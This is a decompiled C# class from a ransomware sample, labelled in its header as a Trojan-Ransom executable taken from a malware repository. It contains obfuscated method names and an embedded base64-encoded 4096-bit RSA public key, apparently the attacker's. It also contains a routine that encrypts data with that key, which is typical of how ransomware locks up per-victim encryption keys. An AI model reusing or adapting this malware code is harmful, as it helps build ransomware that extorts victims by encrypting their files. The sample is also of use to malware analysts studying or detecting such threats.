// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.HAbvOFkMJVoSN
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace kuMeqwHpurUBOD
{
  public static class HAbvOFkMJVoSN
  {
    private static bool URMtKnWIRXzBnExG = false;
    private static readonly string HChZWyoLyPhSN = "NDA5NiE8UlNBS2V5VmFsdWU+PE1vZHVsdXM+cXRGUFhDc3N4Y3ZNQTRQNTJza2UzMTRsZUtqd3RrTUY0RVg1RU1YdjE1bzJ4K0lUZGNnVTc5bUNVSmVSSFVFdEE5bHkzcXlURWpkU0hzRi9tYkpSQ0dOdU5qWVN2ZlVPSFcxOUlQMTlaVnFpYzd3K3NMcWIzUFdTSTIrcmt1WUNZTHUyaFBCTGNtTTl2ZUFjcjJqejdSRUdxWW05UCsxWEVuK0ZJOFpKWmJvK2RkU1dmLzN6NGJCbDZCc2hVQmIyM2dUUHM5Y3RpWDBMTllBc3dpRE52YWlqdks3b2V3Tk0rSUtCaTZHNUdoaEFDWmFUV2w4UytVUGFHUHhoeCtUVjZxSXJGN1VvZHVhN1NMNEJwS204Rk9OUVFjeFFQd1Q1WTVIUXBCMHZjRnphdVlRVHRyRmZhT2FRbzJ1VHVxQmNLdU5UZzRyYW5ibXMzSm9INGpEQ3BtejErc2JHZGJvTmhZbnZ1L3JGNm1vZEZvdWVkRFRFL2VVSUdaRG55OTdzTDFJcWV3RXZmNEZLYU9KTlZWeDQ3cnUzMXkwRVMzQlFIanFaS2dESGx6MC8xLzVyTUtEeTFXS09RanJ0VU90YUpnc0Nic2l0QUNpVGxDcE5meWszY0pzbmFxckhoQk85WjgyY3pDdmpxQzkzVnRMeG5qU2daYmpTMHNOUVNCV2FwV0tRekZOV3JkaXMvelpqRFJCS2JhUC95amIxMmhyMlRaRGFDd0Vnd291MHRjZXk3RHNJTDZ3SFd6Z1FJRVlJaU9ySDRMSlJlb3ZkUmVueHkrRXh4TmhsWWV2VTE5NkJXZGJMZ0QyU2RFRWcyMG1zTnZnU0wrU2ZzUjNQYytwMlJGM0NLS3E4T0lkQ2FDTFhFRmlhYm9zR1FtSWZuK3E0cytpb295UDkvUXM9PC9Nb2R1bHVzPjxFeHBvbmVudD5BUUFCPC9FeHBvbmVudD48L1JTQUtleVZhbHVlPg==";

    public static string IOEmPutvAYpeIgr([In] string obj0)
    {
      int CFNsHziLhJ = 0;
      string PnDRyotjmSC = "";
      HAbvOFkMJVoSN.NIfZnGdgcpaOhG(HAbvOFkMJVoSN.HChZWyoLyPhSN, out CFNsHziLhJ, out PnDRyotjmSC);
      return Convert.ToBase64String(HAbvOFkMJVoSN.ltehSGVvYQLIYGVsv(Encoding.UTF8.GetBytes(obj0), CFNsHziLhJ, PnDRyotjmSC));
    }

    private static byte[] ltehSGVvYQLIYGVsv([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException("Data are empty", "data");
      int num = HAbvOFkMJVoSN.HghdKiIUjZkj(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format("Maximum data length is {0}", (object) num), "data");
      if (!HAbvOFkMJVoSN.fHhumgSRVfyEu(obj1))
        throw new ArgumentException("Key size is not valid", "keySize");
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException("Key is null or empty", "publicKeyXml");
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, HAbvOFkMJVoSN.URMtKnWIRXzBnExG);
      }
    }

    private static int HghdKiIUjZkj([In] int obj0) => HAbvOFkMJVoSN.URMtKnWIRXzBnExG ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool fHhumgSRVfyEu([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void NIfZnGdgcpaOhG(
      string KoiLEkyNKepEF,
      out int CFNsHziLhJ,
      out string PnDRyotjmSC)
    {
      CFNsHziLhJ = 0;
      PnDRyotjmSC = "";
      if (KoiLEkyNKepEF == null || KoiLEkyNKepEF.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(KoiLEkyNKepEF));
      if (!str.Contains("!"))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        CFNsHziLhJ = int.Parse(strArray[0]);
        PnDRyotjmSC = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }
  }
}
